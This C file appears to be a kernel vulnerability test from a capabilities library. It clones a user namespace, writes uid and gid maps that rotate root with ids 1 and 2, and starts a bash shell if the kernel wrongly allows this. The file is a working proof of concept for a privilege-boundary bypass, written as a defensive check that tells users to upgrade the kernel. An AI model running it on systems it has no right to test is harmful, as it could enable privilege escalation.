/*
 * Try unsharing where we remap the root user by rotating uids (0,1,2)
 * and the corresponding gids too.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <unistd.h>

#define STACK_RESERVED 10*1024

struct my_pipe {
    int to[2];
    int from[2];
};

static int child(void *data) {
    struct my_pipe *fdsp = data;
    static const char * const args[] = {"bash", NULL};

    close(fdsp->to[1]);
    close(fdsp->from[0]);
    if (write(fdsp->from[1], "1", 1) != 1) {
	fprintf(stderr, "failed to confirm setuid(1)\n");
	exit(1);
    }
    close(fdsp->from[1]);

    char datum[1];
    if (read(fdsp->to[0], datum, 1) != 1) {
	fprintf(stderr, "failed to wait for parent\n");
	exit(1);
    }
    close(fdsp->to[0]);
    if (datum[0] == '!') {
	/* parent failed */
	exit(0);
    }

    setsid();

    execv("/bin/bash", (const void *) args);
    perror("execv failed");
    exit(1);
}

int main(int argc, char **argv)
{
    static const char *file_formats[] = {
	"/proc/%d/uid_map",
	"/proc/%d/gid_map"
    };
    static const char id_map[] = "0 1 1\n1 2 1\n2 0 1\n3 3 49999997\n";
    cap_value_t fscap = CAP_SETFCAP;
    cap_t orig = cap_get_proc();
    cap_flag_value_t present;

    if (cap_get_flag(orig, CAP_SYS_ADMIN, CAP_EFFECTIVE, &present) != 0) {
	perror("failed to read a capability flag");
	exit(1);
    }
    if (present != CAP_SET) {
	fprintf(stderr,
		"environment missing cap_sys_admin - exploit not testable\n");
	exit(0);
    }

    /* Run with this one lowered */
    cap_set_flag(orig, CAP_EFFECTIVE, 1, &fscap, CAP_CLEAR);

    struct my_pipe fds;
    if (pipe(&fds.from[0]) || pipe(&fds.to[0])) {
	perror("no pipes");
	exit(1);
    }

    char *stack = mmap(NULL, STACK_RESERVED, PROT_READ|PROT_WRITE,
		       MAP_ANONYMOUS|MAP_PRIVATE|MAP_STACK, -1, 0);
    if (stack == MAP_FAILED) {
	perror("no map for stack");
	exit(1);
    }

    if (cap_setuid(1)) {
	perror("failed to cap_setuid(1)");
	exit(1);
    }

    if (cap_set_proc(orig)) {
	perror("failed to raise caps again");
	exit(1);
    }

    pid_t pid = clone(&child, stack+STACK_RESERVED, CLONE_NEWUSER|SIGCHLD, &fds);
    if (pid == -1) {
	perror("clone failed");
	exit(1);
    }

    close(fds.from[1]);
    close(fds.to[0]);

    if (cap_setuid(0)) {
	perror("failed to cap_setuid(0)");
	exit(1);
    }

    if (cap_set_proc(orig)) {
	perror("failed to raise caps again");
	exit(1);
    }

    char datum[1];
    if (read(fds.from[0], datum, 1) != 1 || datum[0] != '1') {
	fprintf(stderr, "failed to read child status\n");
	exit(1);
    }
    close(fds.from[0]);

    int i;
    for (i=0; i<2; i++) {
	char *map_file;
	if (asprintf(&map_file, file_formats[i], pid) < 0) {
	    perror("allocate string");
	    exit(1);
	}

	FILE *f = fopen(map_file, "w");
	free(map_file);
	if (f == NULL) {
	    perror("fopen failed");
	    exit(1);
	}
	int len = fwrite(id_map, 1, strlen(id_map), f);
	if (len != strlen(id_map)) {
	    goto bailok;
	}
	if (fclose(f)) {
	    goto bailok;
	}
    }

    if (write(fds.to[1], ".", 1) != 1) {
	perror("failed to write '.'");
	exit(1);
    }
    close(fds.to[1]);

    fprintf(stderr, "user namespace launched exploit worked - upgrade kernel\n");
    if (wait(NULL) == pid) {
	exit(1);
    }
    perror("launch failed");
    exit(1);

bailok:
    fprintf(stderr, "exploit attempt failed\n");
    if (write(fds.to[1], "!", 1) != 1) {
	perror("failed to inform child [ignored]");
    }
    exit(0);
}
